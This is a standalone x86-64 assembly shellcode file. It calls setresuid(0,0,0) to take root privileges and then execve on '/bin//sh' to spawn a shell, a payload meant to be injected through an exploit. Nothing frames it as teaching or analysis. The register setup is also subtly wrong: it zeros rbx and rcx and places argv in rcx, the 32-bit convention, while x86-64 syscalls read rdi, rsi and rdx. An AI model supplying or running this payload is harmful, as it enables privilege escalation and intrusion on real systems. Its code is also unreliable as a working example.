BITS 64
section .text
global _start

_start:
    ; setresuid(0, 0, 0)
    xor rax, rax
    xor rbx, rbx
    xor rcx, rcx
    xor rdx, rdx
    mov al, 0x75
    syscall

    ; execve("/bin//sh", ["/bin//sh", NULL], NULL)
    xor rax, rax
    and rsp, 0xfffffffffffffff0     ; align stack
    mov al, 0x3b                    ; execve syscall

    xor rcx, rcx
    push rcx                        ; NULL
    mov rbx, 0x68732f2f6e69622f     ; "//sh" + "/bin"
    push rbx
    mov rbx, rsp                    ; rbx = "/bin//sh"
    mov rdi, rbx                    ; set rdi to path

    push rcx                        ; NULL
    mov rdx, rsp                    ; rdx = envp
    push rbx                        ; push pointer to "/bin//sh"
    mov rcx, rsp                    ; rcx = argv

    syscall
